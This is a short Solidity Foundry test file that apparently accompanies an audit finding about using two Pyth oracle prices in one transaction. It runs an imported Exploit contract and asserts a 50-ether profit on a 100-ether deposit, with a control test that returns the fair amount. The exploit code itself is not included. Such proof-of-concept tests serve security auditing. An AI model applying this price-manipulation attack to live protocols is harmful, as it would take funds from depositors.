// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit} from "./32162-h-1-two-pyth-prices-can-be-used-in-the-same-transaction-to-a.sol";

contract Finding32162Test is Test {
    function test_two_prices_pay_150_on_a_100_deposit() public {
        Exploit e = new Exploit();
        e.run();

        console2.log("minted shares", e.maker().minted());
        console2.log("withdrawn", e.got());
        console2.log("extra", e.extra());

        assertEq(e.maker().minted(), 1 ether, "shares");
        assertEq(e.got(), 150 ether, "out");
        assertEq(e.extra(), 50 ether, "extra");
        assertEq(e.token().balanceOf(address(e)), 150 ether, "balance");
    }

    function test_control_one_price_returns_the_deposit() public {
        Exploit e = new Exploit();
        e.runControl();

        console2.log("control out", e.controlGot());
        assertEq(e.controlGot(), 100 ether, "fair");
    }
}
